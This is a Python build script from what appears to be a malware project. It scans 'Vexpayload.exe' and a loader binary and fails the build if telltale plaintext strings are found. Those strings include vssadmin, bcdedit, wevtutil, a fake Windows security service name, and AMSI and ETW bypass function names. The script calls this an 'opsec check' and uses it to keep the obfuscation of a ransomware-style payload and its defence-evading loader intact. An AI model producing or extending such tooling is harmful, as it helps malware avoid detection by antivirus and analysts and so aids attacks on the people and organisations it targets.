#!/usr/bin/env python3
"""Fail the build if high-signal plaintext strings reappear in the binaries.

The X() macro only hides a literal when the compiler folds it; this check is
the regression guard for that property.
"""

import os
import sys

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

CHECKS = {
    os.path.join(ROOT, "x64", "Release", "Vexpayload.exe"): [
        b"BCryptOpenAlgorithmProvider",
        b"BCryptGenRandom",
        b"cmd.exe /c ping",
        b"WindowsSecurityHealthTask",
        b"WindowsSecurityHealthSvc",
        b"vssadmin",
        b"cmd.exe /c start",
        b"root\\cimv2",
        b"WScript.Shell",
        b"wscript.exe",
        b"wevtutil",
        b"bcdedit",
    ],
    os.path.join(ROOT, "loader", "x64", "Release", "xloader.exe"): [
        b"AmsiScanBuffer",
        b"AmsiScanString",
        b"EtwEventWrite",
        b"NtAllocateVirtualMemory",
        b"NtProtectVirtualMemory",
        b"RtlAddFunctionTable",
    ],
}


def main() -> int:
    bad = 0
    for path, needles in CHECKS.items():
        if not os.path.exists(path):
            print(f"[!] missing {path}")
            bad += 1
            continue
        data = open(path, "rb").read()
        for needle in needles:
            if needle in data:
                print(f"[!] {os.path.basename(path)}: plaintext {needle.decode()}")
                bad += 1
    if bad:
        print(f"[-] opsec check failed ({bad})")
        return 1
    print("[+] opsec check: no high-signal plaintext strings")
    return 0


if __name__ == "__main__":
    sys.exit(main())
